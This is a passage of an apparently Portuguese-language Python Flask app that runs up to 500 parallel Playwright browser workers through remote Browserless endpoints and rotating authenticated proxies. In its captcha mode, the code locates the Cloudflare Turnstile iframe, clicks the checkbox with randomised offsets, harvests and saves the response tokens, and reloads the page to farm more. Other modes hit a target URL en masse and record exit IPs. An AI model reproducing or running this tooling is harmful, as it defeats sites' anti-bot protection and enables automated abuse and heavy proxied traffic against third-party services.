                loop_iteration = 0
                last_status_log = 0
                iframe_ready = False
                
                # Primeiro, aguardar o iframe aparecer (até 10s)
                log_print(f"[Tab {worker_id}] Aguardando iframe do Turnstile...")
                for wait_i in range(10):
                    iframe = page.query_selector("iframe")
                    if iframe:
                        box = iframe.bounding_box()
                        if box and box["width"] > 0:
                            log_print(f"[Tab {worker_id}] ✅ Iframe pronto! Box: {box['width']:.0f}x{box['height']:.0f}")
                            iframe_ready = True
                            break
                    time.sleep(1)
                    # Verificar flags de parada
                    with captcha_stop_lock:
                        if captcha_should_stop:
                            break
                    with workers_stop_lock:
                        if workers_should_stop:
                            break
                
                if not iframe_ready:
                    log_print(f"[Tab {worker_id}] ⚠️ Iframe não ficou pronto após 10s, tentando mesmo assim...")
                
                # Loop de resolução (exatamente como no script original)
                while time.time() - attempt_start < max_time:
                    loop_iteration += 1
                    elapsed = time.time() - attempt_start
                    
                    # Log de status a cada 5 segundos
                    if elapsed - last_status_log >= 5:
                        log_print(f"[Tab {worker_id}] ⏱️ {elapsed:.1f}s decorridos | cliques: {click_count} | iteração: {loop_iteration}")
                        last_status_log = elapsed
                    
                    # Verificar flags de parada
                    with captcha_stop_lock:
                        if captcha_should_stop:
                            log_print(f"[Tab {worker_id}] Stop flag detectada no loop!")
                            break
                    with workers_stop_lock:
                        if workers_should_stop:
                            log_print(f"[Tab {worker_id}] Workers stop flag detectada no loop!")
                            break
                    
                    # Verifica token - primeiro no callback, depois no elemento original
                    try:
                        token = None
                        
                        # Tentar obter do elemento de callback primeiro
                        cf_token_elem = page.query_selector("#cf-token")
                        if cf_token_elem:
                            token = cf_token_elem.get_attribute("value")
                        
                        # Se não encontrou, tentar elemento original do Turnstile
                        if not token or len(token) < 50:
                            elem = page.query_selector("[name=cf-turnstile-response]")
                            if elem:
                                token = elem.get_attribute("value")
                        
                        if token and len(token) > 50:
                            processing_time = time.time() - attempt_start
                            solve_count += 1
                            
                            log_print(f"[Tab {worker_id}] 🎉 TOKEN ENCONTRADO! Tamanho: {len(token)}")
                            
                            # Salva token
                            save_turnstile_token(token, worker_id, processing_time, sitekey, solve_count)
                            
                            # Atualiza stats globais
                            with captcha_stats_lock:
                                captcha_stats["solved"] += 1
                                total_solved = captcha_stats["solved"]
                            
                            log_print(f"    ✓ [Tab {worker_id}] #{solve_count} RESOLVIDO em {processing_time:.1f}s (Total: {total_solved})")
                            
                            # Envia evento para o frontend via queue
                            if results_queue is not None:
                                results_queue.append({
                                    "type": "captcha_solved",
                                    "worker_id": worker_id,
                                    "solve_count": solve_count,
                                    "time": round(processing_time, 1),
                                    "total_solved": total_solved,
                                    "token_preview": token[:30] + "..."
                                })
                            
                            resolved = True
                            break
                    except Exception as token_err:
                        if loop_iteration == 1:
                            log_print(f"[Tab {worker_id}] Erro ao verificar token: {str(token_err)[:50]}")
                    
                    # Clica no checkbox (exatamente como no script original)
                    if click_count < 5:
                        try:
                            iframe = page.query_selector("iframe")
                            if iframe:
                                if click_count == 0 and loop_iteration == 1:
                                    log_print(f"[Tab {worker_id}] 📦 Iframe encontrado!")
                                
                                box = iframe.bounding_box()
                                if box and box["width"] > 0:
                                    if click_count == 0 and loop_iteration == 1:
                                        log_print(f"[Tab {worker_id}] 📐 Bounding box: {box}")
                                    
                                    frame = iframe.content_frame()
                                    if frame:
                                        if click_count == 0 and loop_iteration == 1:
                                            log_print(f"[Tab {worker_id}] 🖼️ Frame content obtido!")
                                        
                                        checkbox = frame.query_selector("input")
                                        if checkbox:
                                            cbox = checkbox.bounding_box()
                                            if cbox:
                                                x = cbox["x"] + cbox["width"]/2 + random.randint(-3, 3)
                                                y = cbox["y"] + cbox["height"]/2 + random.randint(-3, 3)
                                                log_print(f"[Tab {worker_id}] 🖱️ Clicando no checkbox em ({x:.0f}, {y:.0f})...")
                                                page.mouse.click(x, y)
                                                click_count += 1
                                                log_print(f"[Tab {worker_id}] ✅ Clique #{click_count} realizado!")
                                        elif click_count < 2:
                                            x = box["x"] + box["width"]/2
                                            y = box["y"] + box["height"]/2
                                            log_print(f"[Tab {worker_id}] 🖱️ Clicando no centro do iframe em ({x:.0f}, {y:.0f})...")
                                            page.mouse.click(x, y)
                                            click_count += 1
                                            log_print(f"[Tab {worker_id}] ✅ Clique #{click_count} no iframe realizado!")
                                    else:
                                        if loop_iteration == 1:
                                            log_print(f"[Tab {worker_id}] ⚠️ Não conseguiu obter content_frame do iframe")
                                else:
                                    if loop_iteration == 1:
                                        log_print(f"[Tab {worker_id}] ⚠️ Bounding box inválido: {box}")
                            else:
                                if loop_iteration == 1:
                                    log_print(f"[Tab {worker_id}] ⚠️ Nenhum iframe encontrado na página!")
                                    # Listar todos os elementos para debug
                                    all_iframes = page.query_selector_all("iframe")
                                    log_print(f"[Tab {worker_id}] Total de iframes: {len(all_iframes)}")
                        except Exception as click_err:
                            if click_count == 0:
                                log_print(f"[Tab {worker_id}] ❌ Erro ao clicar: {str(click_err)[:80]}")
                    
                    time.sleep(0.1)
                
                # Se não resolveu (timeout), registra (como no script original)
                if not resolved:
                    with captcha_stop_lock:
                        if captcha_should_stop:
                            break
                    with workers_stop_lock:
                        if workers_should_stop:
                            break
                    
                    with captcha_stats_lock:
                        captcha_stats["reloads"] += 1
                        total_reloads = captcha_stats["reloads"]
                    log_print(f"    ⟳ [Tab {worker_id}] Timeout após {max_time}s - recarregando... (Total reloads: {total_reloads})")
                    
                    if results_queue is not None:
                        results_queue.append({
                            "type": "captcha_reload",
                            "worker_id": worker_id
                        })
                
                # Recarrega a página para próxima tentativa (como no script original)
                with captcha_stop_lock:
                    if captcha_should_stop:
                        break
                with workers_stop_lock:
                    if workers_should_stop:
                        break
                
                try:
                    log_print(f"[Tab {worker_id}] 🔄 Recarregando página...")
                    page.reload()
                    log_print(f"[Tab {worker_id}] ✅ Página recarregada! Aguardando 1s...")
                    time.sleep(1)
                except Exception as reload_err:
                    log_print(f"[Tab {worker_id}] ⚠️ Erro no reload: {str(reload_err)[:50]}, tentando goto...")
                    # Se falhar reload, tenta goto (como no script original)
                    try:
                        page.goto(url)
                        log_print(f"[Tab {worker_id}] ✅ Navegação goto bem-sucedida!")
                    except Exception as goto_err:
                        log_print(f"[Tab {worker_id}] ❌ Erro no goto: {str(goto_err)[:50]}")
            
            # Cleanup quando stop_flag é setada (como no script original)
            log_print(f"[Tab {worker_id}] Fechando...")
            result["success"] = True
            result["captcha_solved"] = solve_count
            result["details"] = f"✅ {solve_count} captchas resolvidos"
            
    except Exception as error:
        error_msg = str(error)
        if "Target page" in error_msg or "has been closed" in error_msg:
            result["error"] = "Página/contexto/browser foi fechado"
            result["details"] = "Recurso foi fechado durante execução"
        else:
            result["error"] = error_msg[:100]
            result["details"] = f"Erro: {error_msg[:50]}"
        log_print(f"[Tab {worker_id}] Erro: {error_msg}")
    
    finally:
        # Fechar recursos
        try:
            if context:
                context.close()
        except:
            pass
        
        try:
            if browser:
                browser.close()
        except:
            pass
    
    result["duration"] = round(time.time() - start, 2)
    result["captcha_solved"] = solve_count
    sys.excepthook = original_excepthook
    
    return result


def run_single_worker(worker_id: int, target_url: str, ws_endpoint: str, 
                       proxy_server: str, proxy_username: str, proxy_password: str,
                       use_proxy: bool):
    """Executa um único worker."""
    # Configurar handler de exceções para esta thread
    sys.excepthook = suppress_playwright_errors
    
    result = {
        "worker_id": worker_id,
        "success": False,
        "ip": None,
        "location": None,
        "title": None,
        "error": None,
        "details": "",
        "duration": 0,
        "proxy_used": use_proxy,
        "response_content": None,
        "response_preview": None,
        "status_code": None,
        "url": target_url
    }
    
    start = time.time()
    browser = None
    context = None
    page = None
    MAX_EXECUTION_TIME = 120  # Tempo máximo: 2 minutos por worker
    
    try:
        with sync_playwright() as p:
            # Conectar ao servidor WebSocket com tratamento robusto de erros
            try:
                # Conectar via CDP (como no exemplo Node.js com connectOverCDP)
                # Suprimir erros do Playwright durante a conexão
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    browser = p.chromium.connect_over_cdp(ws_endpoint, timeout=10000)
            except KeyError as key_err:
                # Erro interno do Playwright (KeyError: 'error')
                result["error"] = "Erro interno do Playwright (WebSocket/CDP)"
                result["details"] = f"Falha na comunicação com o navegador remoto. Endpoint pode estar incorreto ou servidor indisponível: {ws_endpoint}"
                return result
            except Exception as conn_error:
                error_msg = str(conn_error)
                error_type = type(conn_error).__name__
                
                # Capturar KeyError especificamente
                if "KeyError" in error_type or "KeyError" in error_msg:
                    result["error"] = "Erro interno do Playwright (WebSocket/CDP)"
                    result["details"] = f"Falha na comunicação. Verifique se o endpoint está correto e o servidor está rodando: {ws_endpoint}"
                elif "timeout" in error_msg.lower() or "connection" in error_msg.lower():
                    result["error"] = f"Falha ao conectar ao WebSocket: {error_msg[:100]}"
                    result["details"] = f"Timeout ou erro de conexão. Endpoint: {ws_endpoint}"
                else:
                    result["error"] = f"Erro de conexão: {error_msg[:100]}"
                    result["details"] = f"Erro ao conectar ao servidor Browserless: {ws_endpoint}"
                return result
            
            try:
                # Criar contexto com ou sem proxy
                # Suprimir warnings durante criação do contexto
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    if use_proxy:
                        context = browser.new_context(
                            proxy={
                                "server": proxy_server,
                                "username": proxy_username,
                                "password": proxy_password
                            },
                            ignore_https_errors=True
                        )
                    else:
                        context = browser.new_context(ignore_https_errors=True)
                    
                    page = context.new_page()
                
                # Primeiro verificar IP (timeout curto para não consumir memória)
                # Se falhar, não é crítico - continuar mesmo assim
                try:
                    if time.time() - start > MAX_EXECUTION_TIME:
                        raise Exception("Tempo máximo excedido antes de verificar IP")
                    # Usar timeout menor e wait_until mais permissivo para evitar travamentos
                    # Suprimir erros do Playwright durante goto
                    with warnings.catch_warnings():
                        warnings.simplefilter("ignore")
                        try:
                            page.goto("https://api.ipify.org?format=json", timeout=10000, wait_until="domcontentloaded")
                            ip_content = page.content()
                            ip_match = re.search(r'"ip":\s*"([^"]+)"', ip_content)
                            if ip_match:
                                result["ip"] = ip_match.group(1)
                        except KeyError:
                            # Erro interno do Playwright - ignorar e continuar
                            pass
                except Exception as e:
                    error_msg = str(e)
                    error_type = type(e).__name__
                    # Ignorar KeyError do Playwright
                    if "KeyError" in error_type:
                        pass
                    # Se for erro de proxy, logar mas continuar
                    elif "tunnel" in error_msg.lower() or "proxy" in error_msg.lower() or "connection" in error_msg.lower():
                        result["details"] = f"⚠️ Proxy pode estar indisponível: {error_msg[:80]}"
                        # Continuar mesmo com erro de proxy - tentar acessar URL alvo
                    pass
                
                # Tentar pegar localização (timeout curto)
                try:
                    if time.time() - start > MAX_EXECUTION_TIME:
                        raise Exception("Tempo máximo excedido antes de verificar localização")
                    with warnings.catch_warnings():
                        warnings.simplefilter("ignore")
                        try:
                            page.goto("https://ipinfo.io/json", timeout=15000, wait_until="networkidle")
                            loc_content = page.content()
                            city_match = re.search(r'"city":\s*"([^"]+)"', loc_content)
                            region_match = re.search(r'"region":\s*"([^"]+)"', loc_content)
                            country_match = re.search(r'"country":\s*"([^"]+)"', loc_content)
                            
                            if city_match and country_match:
                                city = city_match.group(1)
                                region = region_match.group(1) if region_match else ""
                                country = country_match.group(1)
                                result["location"] = f"{city}, {region}, {country}".replace(", ,", ",").strip(", ")
                        except KeyError:
                            # Erro interno do Playwright - ignorar
                            pass
                except Exception as e:
                    # Ignorar KeyError do Playwright
                    if "KeyError" not in type(e).__name__:
                        pass
                
                # Acessar URL alvo (verificar tempo antes)
                if time.time() - start > MAX_EXECUTION_TIME:
                    raise Exception("Tempo máximo excedido antes de acessar URL alvo")
                
                # Suprimir erros do Playwright durante acesso à URL
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    try:
                        response = page.goto(target_url, timeout=300000, wait_until="domcontentloaded")
                        result["status_code"] = response.status if response else None
                        content = page.content()
                    except KeyError:
                        # Erro interno do Playwright - tentar continuar
                        result["status_code"] = None
                        try:
                            content = page.content()
                        except:
                            content = ""
                
                # Tentar pegar título de várias formas
                title = None
                try:
                    with warnings.catch_warnings():
                        warnings.simplefilter("ignore")
                        try:
                            title = page.title()
                        except (KeyError, Exception):
                            pass
                except:
                    pass
                
                # Se não conseguiu pelo page.title(), tentar extrair do HTML
                if not title or title.strip() == "":
                    try:
                        title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
                        if title_match:
                            title = title_match.group(1).strip()
                    except:
                        pass
                
                # Garantir que content não seja None
                if not content:
                    content = ""
                
                # Extrair preview do conteúdo (primeiros 500 chars)
                # Remover tags HTML para preview mais limpo
                text_content = re.sub(r'<[^>]+>', ' ', content)
                text_content = ' '.join(text_content.split())[:500]
                result["response_preview"] = text_content
                
                # Salvar conteúdo completo (limitado a 50KB para não sobrecarregar)
                if len(content) > 50000:
                    result["response_content"] = content[:50000] + "\n... [truncado]"
                else:
                    result["response_content"] = content
                
                # Sempre incluir título, mesmo que vazio
                result["title"] = title[:80].strip() if title and title.strip() else "Sem título"
                result["success"] = True
                
                # Capturar screenshot da página apenas se estiver habilitado
                with screenshots_enabled_lock:
                    should_capture = capture_screenshots_enabled
                
                if should_capture:
                    try:
                        with warnings.catch_warnings():
                            warnings.simplefilter("ignore")
                            screenshot_bytes = page.screenshot(full_page=False, timeout=5000)
                            screenshot_base64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                            
                            # Armazenar screenshot no dicionário global
                            with screenshots_lock:
                                worker_screenshots[worker_id] = {
                                    "screenshot": screenshot_base64,
                                    "url": target_url,
                                    "title": result["title"],
                                    "timestamp": time.time()
                                }
                    except Exception as e:
                        # Se falhar ao capturar screenshot, continuar normalmente
                        pass
                
                country = result["location"].split(", ")[-1] if result["location"] else ""
                flag = "🇧🇷" if country == "BR" else "🌍"
                result["details"] = f"{flag} {len(content):,} bytes | Status: {result['status_code']}"
                
            except KeyError as key_err:
                # Erro interno do Playwright (KeyError: 'error')
                result["error"] = "Erro interno do Playwright (WebSocket/CDP)"
                result["details"] = f"Falha na comunicação com o navegador remoto durante execução. O servidor pode ter desconectado ou estar sobrecarregado."
            except Exception as inner_error:
                # Capturar erros internos do Playwright/WebSocket
                error_msg = str(inner_error)
                error_type = type(inner_error).__name__
                error_lower = error_msg.lower()
                
                # Detectar KeyError especificamente
                if "KeyError" in error_type or "KeyError" in error_msg:
                    result["error"] = "Erro interno do Playwright (WebSocket/CDP)"
                    result["details"] = "Falha na comunicação com o navegador remoto. O servidor pode ter desconectado ou estar sobrecarregado."
                # Detectar erros específicos de proxy/tunnel
                elif "tunnel" in error_lower or "err_tunnel" in error_lower:
                    result["error"] = "Erro de conexão com proxy (Tunnel)"
                    result["details"] = "Proxy não conseguiu estabelecer túnel HTTPS. Verifique: 1) Proxy está online? 2) Credenciais corretas? 3) Proxy suporta HTTPS?"
                elif "proxy" in error_lower and ("connection" in error_lower or "failed" in error_lower):
                    result["error"] = "Falha na conexão com proxy"
                    result["details"] = "Não foi possível conectar ao servidor proxy. Verifique se está online e acessível."
                else:
                    result["error"] = error_msg[:100]
                    result["details"] = error_msg[:50]
            finally:
                # SEMPRE fechar recursos para liberar memória com tratamento robusto
                try:
                    if page:
                        try:
                            page.close()
                        except:
                            pass
                except:
                    pass
                try:
                    if context:
                        try:
                            context.close()
                        except:
                            pass
                except:
                    pass
                try:
                    if browser:
                        try:
                            browser.close()
                        except:
                            pass
                except:
                    pass

    except KeyError as key_err:
        # Erro interno do Playwright (KeyError: 'error')
        result["error"] = "Erro interno do Playwright (WebSocket/CDP)"
        result["details"] = f"Falha na comunicação com o navegador remoto. O servidor pode estar indisponível ou o endpoint incorreto: {ws_endpoint}"
        # Garantir fechamento mesmo em caso de exceção
        try:
            if browser:
                browser.close()
        except:
            pass
    except Exception as e:
        # Capturar TODOS os erros, incluindo KeyError do Playwright
        error_msg = str(e)
        error_type = type(e).__name__
        
        if "KeyError" in error_type or "KeyError" in error_msg:
            result["error"] = "Erro interno do Playwright (WebSocket/CDP)"
            result["details"] = f"Falha na comunicação com o navegador remoto. Endpoint: {ws_endpoint}"
        elif "timeout" in error_msg.lower():
            result["error"] = "Timeout ao conectar"
            result["details"] = f"Tempo de conexão excedido. Endpoint: {ws_endpoint}"
        elif "connection" in error_msg.lower() or "connect" in error_msg.lower():
            result["error"] = "Falha de conexão"
            result["details"] = f"Não foi possível conectar ao servidor Browserless. Endpoint: {ws_endpoint}"
        else:
            result["error"] = error_msg[:100]
            result["details"] = error_msg[:50]
        
        # Garantir fechamento mesmo em caso de exceção
        try:
            if browser:
                browser.close()
        except:
            pass
    
    result["duration"] = round(time.time() - start, 2)
    
    # Restaurar handler padrão
    sys.excepthook = original_excepthook
    
    return result


def run_workers_thread(url: str, num_workers: int, ws_endpoint: str,
                       proxy_server: str, proxy_username: str, proxy_password: str,
                       use_proxy: bool, results_queue, mode_7k: bool = False,
                       mode_captcha: bool = False):
    """Executa workers em threads paralelas."""
    global captcha_stats
    start_time = time.time()
    
    # Resetar stats de captcha se for modo captcha
    if mode_captcha:
        with captcha_stats_lock:
            captcha_stats["solved"] = 0
            captcha_stats["failed"] = 0
            captcha_stats["reloads"] = 0
            captcha_stats["start_time"] = time.time()
    
    # Permitir todos os workers simultâneos (até 500)
    # IMPORTANTE: ThreadPoolExecutor pode ter limitações práticas, mas vamos forçar
    # todos os workers a serem submetidos imediatamente
    max_workers_value = num_workers  # Sem limite artificial - usar exatamente o número solicitado
    if max_workers_value > 500:
        max_workers_value = 500  # Limite de segurança
    
    # Criar executor com número exato de workers solicitados
    with ThreadPoolExecutor(max_workers=max_workers_value) as executor:
        futures = {}
        
        # Submeter TODOS os workers imediatamente em um único loop
        # Não esperar nenhum - todos devem ser submetidos de uma vez
        mode_text = "captcha" if mode_captcha else ("7k" if mode_7k else "normal")
        print(f"[DEBUG] Submetendo {num_workers} workers simultaneamente (max_workers={max_workers_value}, mode={mode_text})...")
        for i in range(1, num_workers + 1):
            results_queue.append({"type": "worker_start", "worker_id": i})
            # Submeter imediatamente - não esperar
            if mode_captcha:
                # Usar função específica para modo captcha
                future = executor.submit(
                    run_single_worker_captcha, i, ws_endpoint,
                    proxy_server, proxy_username, proxy_password, use_proxy,
                    results_queue
                )
                futures[future] = i
            elif mode_7k:
                # Usar função específica para modo 7k
                future = executor.submit(
                    run_single_worker_7k, i, ws_endpoint,
                    proxy_server, proxy_username, proxy_password, use_proxy
                )
            else:
                # Usar função normal
                future = executor.submit(
                    run_single_worker, i, url, ws_endpoint,
                    proxy_server, proxy_username, proxy_password, use_proxy
                )
                futures[future] = i
        
        print(f"[DEBUG] ✅ {len(futures)} workers submetidos ao executor. Aguardando conclusão...")
        
        # Verificar se todos foram submetidos
        if len(futures) != num_workers:
            print(f"[WARNING] Apenas {len(futures)} de {num_workers} workers foram submetidos!")
        else:
            print(f"[OK] Todos os {num_workers} workers foram submetidos com sucesso!")
        
        # Processar resultados conforme terminam
        for future in as_completed(futures):
            worker_id = futures[future]
            try:
                result = future.result()
                results_queue.append({
                    "type": "worker_result",
                    "worker_id": worker_id,
                    "success": result["success"],
                    "ip": result["ip"],
                    "location": result.get("location"),
                    "title": result["title"],
                    "error": result["error"],
                    "details": result["details"],
                    "duration": result["duration"],
                    "proxy_used": result.get("proxy_used", False),
                    "status_code": result.get("status_code"),
                    "response_preview": result.get("response_preview"),
                    "response_content": result.get("response_content"),
                    "url": url
                })
            except KeyError as key_err:
                # Erro interno do Playwright (KeyError: 'error')
                results_queue.append({
                    "type": "worker_result",
                    "worker_id": worker_id,
                    "success": False,
                    "error": "Erro interno do Playwright (WebSocket/CDP)",
                    "details": f"Falha na comunicação com o navegador remoto. Endpoint: {ws_endpoint}",
                    "proxy_used": use_proxy
                })
            except Exception as e:
                error_msg = str(e)
                error_type = type(e).__name__
                
                # Capturar KeyError especificamente
                if "KeyError" in error_type or "KeyError" in error_msg:
                    error_msg = "Erro interno do Playwright (WebSocket/CDP)"
                    details = f"Falha na comunicação com o navegador remoto. Endpoint: {ws_endpoint}"
                else:
                    details = error_msg[:50]
                
                results_queue.append({
                    "type": "worker_result",
                    "worker_id": worker_id,
                    "success": False,
                    "error": error_msg[:100],
                    "details": details,
                    "proxy_used": use_proxy
                })
    
    success_count = sum(1 for r in results_queue if r.get("type") == "worker_result" and r.get("success"))
    fail_count = sum(1 for r in results_queue if r.get("type") == "worker_result" and not r.get("success"))
    elapsed = round(time.time() - start_time, 1)
    
    # Incluir estatísticas de captcha se estiver no modo captcha
    captcha_total = 0
    if mode_captcha:
        with captcha_stats_lock:
            captcha_total = captcha_stats["solved"]
    
    results_queue.append({
        "type": "complete",
        "success": success_count,
        "fail": fail_count,
        "elapsed": elapsed,
        "captcha_total": captcha_total
    })


@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route("/api/test-connection", methods=["POST"])
def api_test_connection():
    """Testa conexão com o servidor."""
    data = request.get_json()
    ws_endpoint = data.get("ws_endpoint", DEFAULT_WS_ENDPOINT)
    proxy_server = data.get("proxy_server", PROXY_CONFIG["server"])
    proxy_username = data.get("proxy_username", PROXY_CONFIG["username"])
    proxy_password = data.get("proxy_password", PROXY_CONFIG["password"])
    
    browser = None
    context = None
    page = None
    
    try:
        with sync_playwright() as p:
            try:
                browser = p.chromium.connect_over_cdp(ws_endpoint, timeout=15000)
            except Exception as conn_error:
                error_msg = str(conn_error)
                if "KeyError" in error_msg:
                    return jsonify({
                        "success": False,
                        "error": "Erro interno do Playwright. Verifique o endpoint WebSocket."
                    }), 500
                else:
                    return jsonify({
                        "success": False,
                        "error": f"Falha ao conectar: {error_msg[:100]}"
                    }), 500
            
            try:
                context = browser.new_context(
                    proxy={
                        "server": proxy_server,
                        "username": proxy_username,
                        "password": proxy_password
                    },
                    ignore_https_errors=True
                )
                page = context.new_page()
                page.goto("https://ipinfo.io/json", timeout=30000, wait_until="domcontentloaded")
                content = page.content()
                
                ip_match = re.search(r'"ip":\s*"([^"]+)"', content)
                country_match = re.search(r'"country":\s*"([^"]+)"', content)
                city_match = re.search(r'"city":\s*"([^"]+)"', content)
                
                ip = ip_match.group(1) if ip_match else "N/A"
                country = country_match.group(1) if country_match else "N/A"
                city = city_match.group(1) if city_match else "N/A"
                
                return jsonify({
                    "success": True,
                    "ip": ip,
                    "country": country,
                    "city": city
                })
            except Exception as inner_error:
                error_msg = str(inner_error)
                if "KeyError" in error_msg:
                    return jsonify({
                        "success": False,
                        "error": "Erro interno do Playwright (WebSocket/CDP)"
                    }), 500
                else:
                    return jsonify({
                        "success": False,
                        "error": f"Erro ao executar: {error_msg[:100]}"
                    }), 500
            finally:
                # SEMPRE fechar recursos para liberar memória
                try:
                    if page:
                        try:
                            page.close()
                        except:
                            pass
                except:
                    pass
                try:
                    if context:
                        try:
                            context.close()
                        except:
                            pass
                except:
                    pass
                try:
                    if browser:
                        try:
                            browser.close()
                        except:
                            pass
                except:
                    pass
                    
    except Exception as e:
        # Capturar TODOS os erros, incluindo KeyError
        error_msg = str(e)
        error_type = type(e).__name__
        
        if "KeyError" in error_type or "KeyError" in error_msg:
            return jsonify({
                "success": False,
                "error": "Erro interno do Playwright (WebSocket/CDP)"
            }), 500
        else:
            return jsonify({
                "success": False,
                "error": f"Erro: {error_msg[:100]}"
            }), 500
        try:
            if browser:
                browser.close()
        except:
            pass
        
        return jsonify({
            "success": False,
            "error": str(e)[:100]
        })


def run_workers_multiple_servers_thread(url: str, servers: list, 
                                       proxy_server: str, proxy_username: str, 
                                       proxy_password: str, use_proxy: bool, 
                                       results_queue: list, mode_7k: bool = False,
                                       mode_captcha: bool = False):
    """Executa workers distribuídos entre múltiplos servidores."""
    global captcha_stats
    start_time = time.time()
    
    # Resetar stats de captcha se for modo captcha
    if mode_captcha:
        with captcha_stats_lock:
            captcha_stats["solved"] = 0
            captcha_stats["failed"] = 0
            captcha_stats["reloads"] = 0
            captcha_stats["start_time"] = time.time()
    
    # Calcular total de workers
    total_workers = sum(s["workers"] for s in servers)
    
    # Criar lista de tarefas com servidor atribuído
    tasks = []
    worker_id = 1
    for server in servers:
        ws_endpoint = server.get("endpoint", "").strip()
        if not ws_endpoint:
            print(f"[WARNING] Servidor sem endpoint válido: {server}")
            continue
        
        for i in range(server["workers"]):
            tasks.append({
                "worker_id": worker_id,
                "ws_endpoint": ws_endpoint,
                "url": url,
                "proxy_server": proxy_server,
                "proxy_username": proxy_username,
                "proxy_password": proxy_password,
                "use_proxy": use_proxy
            })
            worker_id += 1
    
    # Executar todos os workers em paralelo
    max_workers_value = min(total_workers, 500)
    with ThreadPoolExecutor(max_workers=max_workers_value) as executor:
        futures = {}
        
        mode_text = "captcha" if mode_captcha else ("7k" if mode_7k else "normal")
        print(f"[DEBUG] Distribuindo {total_workers} workers entre {len(servers)} servidor(es) (mode={mode_text})...")
        for task in tasks:
            # Log do endpoint que será usado
            print(f"[DEBUG] Worker #{task['worker_id']} usando endpoint: {task['ws_endpoint']}")
            results_queue.append({
                "type": "worker_start", 
                "worker_id": task["worker_id"],
                "endpoint": task["ws_endpoint"]
            })
            if mode_captcha:
                # Usar função específica para modo captcha
                future = executor.submit(
                    run_single_worker_captcha, 
                    task["worker_id"], 
                    task["ws_endpoint"],
                    task["proxy_server"], 
                    task["proxy_username"], 
                    task["proxy_password"], 
                    task["use_proxy"],
                    results_queue
                )
                futures[future] = task["worker_id"]
            elif mode_7k:
                # Usar função específica para modo 7k
                future = executor.submit(
                    run_single_worker_7k, 
                    task["worker_id"], 
                    task["ws_endpoint"],
                    task["proxy_server"], 
                    task["proxy_username"], 
                    task["proxy_password"], 
                    task["use_proxy"]
                )
            else:
                # Usar função normal
                future = executor.submit(
                    run_single_worker, 
                    task["worker_id"], 
                    task["url"], 
                    task["ws_endpoint"],
                    task["proxy_server"], 
                    task["proxy_username"], 
                    task["proxy_password"], 
                    task["use_proxy"]
                )
                futures[future] = task["worker_id"]
        
        print(f"[DEBUG] ✅ {len(futures)} workers submetidos. Aguardando conclusão...")
        
        # Processar resultados conforme terminam
        for future in as_completed(futures):
            worker_id = futures[future]
            # Encontrar o endpoint usado por este worker
            task_endpoint = None
            for task in tasks:
                if task["worker_id"] == worker_id:
                    task_endpoint = task["ws_endpoint"]
                    break
            
            try:
                result = future.result()
                results_queue.append({
                    "type": "worker_result",
                    "worker_id": worker_id,
                    "success": result["success"],
                    "ip": result["ip"],
                    "location": result.get("location"),
                    "title": result["title"],
                    "error": result["error"],
                    "details": result["details"],
                    "duration": result["duration"],
                    "proxy_used": result.get("proxy_used", False),
                    "status_code": result.get("status_code"),
                    "response_preview": result.get("response_preview"),
                    "response_content": result.get("response_content"),
                    "url": url,
                    "endpoint": task_endpoint
                })
            except KeyError as key_err:
                # Erro interno do Playwright (KeyError: 'error')
                results_queue.append({
                    "type": "worker_result",
                    "worker_id": worker_id,
                    "success": False,
                    "error": "Erro interno do Playwright (WebSocket/CDP)",
                    "details": f"Falha na comunicação com o navegador remoto. Endpoint: {task_endpoint}",
                    "duration": 0,
                    "proxy_used": use_proxy,
                    "url": url,
                    "endpoint": task_endpoint
                })
            except Exception as e:
                error_msg = str(e)
                error_type = type(e).__name__
                
                # Capturar KeyError especificamente
                if "KeyError" in error_type or "KeyError" in error_msg:
                    error_msg = "Erro interno do Playwright (WebSocket/CDP)"
                    details = f"Falha na comunicação com o navegador remoto. Endpoint: {task_endpoint}"
                else:
                    details = error_msg[:50]
                
                results_queue.append({
                    "type": "worker_result",
                    "worker_id": worker_id,
                    "success": False,
                    "error": error_msg[:100],
                    "details": details,
                    "duration": 0,
                    "proxy_used": use_proxy,
                    "url": url,
                    "endpoint": task_endpoint
                })
    
    elapsed = round(time.time() - start_time, 1)
    success_count = sum(1 for r in results_queue if r.get("type") == "worker_result" and r.get("success"))
    fail_count = sum(1 for r in results_queue if r.get("type") == "worker_result" and not r.get("success"))
    
    # Incluir estatísticas de captcha se estiver no modo captcha
    captcha_total = 0
    if mode_captcha:
        with captcha_stats_lock:
            captcha_total = captcha_stats["solved"]
    
    results_queue.append({
        "type": "complete",
        "total": total_workers,
        "success": success_count,
        "failed": fail_count,
        "elapsed": elapsed,
        "captcha_total": captcha_total
    })


@app.route("/api/run-workers", methods=["POST"])
def api_run_workers():
    """Executa múltiplos workers."""
    global workers_should_stop, captcha_should_stop
    data = request.get_json()
    target_url = data.get("url", "https://api.ipify.org?format=json")
    use_proxy = data.get("use_proxy", True)
    proxy_server = data.get("proxy_server", PROXY_CONFIG["server"])
    proxy_username = data.get("proxy_username", PROXY_CONFIG["username"])
    proxy_password = data.get("proxy_password", PROXY_CONFIG["password"])
    mode_7k = data.get("mode_7k", False)  # Parâmetro para modo 7k
    mode_captcha = data.get("mode_captcha", False)  # Parâmetro para modo captcha
    
    # Resetar flag de stop quando iniciar novos workers
    if mode_7k or mode_captcha:
        with workers_stop_lock:
            workers_should_stop = False
        if mode_captcha:
            with captcha_stop_lock:
                captcha_should_stop = False
    
    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url
    
    results_queue = []
    
    # Verificar se há múltiplos servidores ou servidor único
    servers = data.get("servers", [])
    
    if servers and len(servers) > 0:
        # Usar múltiplos servidores
        thread = threading.Thread(
            target=run_workers_multiple_servers_thread,
            args=(target_url, servers, proxy_server, proxy_username, 
                  proxy_password, use_proxy, results_queue, mode_7k, mode_captcha)
        )
        thread.start()
    else:
        # Fallback para servidor único (compatibilidade)
        num_workers = int(data.get("num_workers", 20))
        if num_workers < 1:
            num_workers = 1
        if num_workers > 500:
            num_workers = 500
        ws_endpoint = data.get("ws_endpoint", DEFAULT_WS_ENDPOINT)
        
        thread = threading.Thread(
            target=run_workers_thread,
            args=(target_url, num_workers, ws_endpoint,
                  proxy_server, proxy_username, proxy_password,
